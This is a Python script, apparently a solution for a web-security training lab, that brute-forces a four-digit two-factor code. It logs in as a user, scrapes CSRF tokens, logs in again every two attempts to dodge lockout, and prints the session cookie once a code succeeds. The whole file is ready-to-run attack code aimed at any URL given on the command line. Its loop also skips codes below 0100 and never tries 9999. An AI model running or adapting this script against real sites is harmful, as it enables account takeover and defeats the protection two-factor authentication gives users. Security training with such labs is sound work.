import sys
import requests
import urllib3
from bs4 import BeautifulSoup

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

#2FA bypass using a brute-force attack

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#extarcting to csrf token for login 
def csrf(session,url):
    requeste=session.get(url,verify=False,proxies=proxie)
    soup=BeautifulSoup(requeste.text,'html.parser')
    csrf_token_extracte=soup.find("input",{"name":"csrf"})["value"]
    return csrf_token_extracte

#Login to Carlos' account every two attempts to prevent blockages.
#Two CSRF tokens are required, one for /login and two for /login 2.
def login(session,url):
    url_login=url+"/login"
    csrf_token_login=csrf(session,url_login)
    data={"username":"carlos","password":"montoya","csrf":csrf_token_login}
    response=session.post(url_login,verify=False,data=data,proxies=proxie)
    if "Please enter your 4-digit security code" in response.text:
        print(('(+) Entering the MFA code ....'))
        url_mfa=url+"/login2"
        csrf_token_mfa=csrf(session,url_mfa)
        return csrf_token_mfa
    else:
        print('(-) Error')

"""
--> Our principle function, which we call the login function, is to login and send the 2-FA code verification.
--> Set up a counter for two attempts.
--> Find the MFA code by looping between 100 and 9999."""

def FA2(session,url):
    csrf_token=login(session,url)
    count=0
    for num in range(100,9999):
       
        if len(str(num))==3:
            num="0"+str(num)
        fa2_url=url+"/login2"
        data={"csrf":csrf_token,"mfa-code":num}
        response=session.post(fa2_url,verify=False,proxies=proxie,data=data)
        
        if "Log out" in response.text:
            print("(+) MFA-CODE %s"%num)
            session_value=session.cookies.get_dict()
            print("(+) Session : %s" %list(session_value.values())[0])
            exit()
        else:
            count=count+1
        
        if count >1:
            count=0
            csrf_token=login(session,url)
    

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    session=requests.session()
    url=sys.argv[1]
    FA2(session,url)




if __name__=="__main__":
    main()
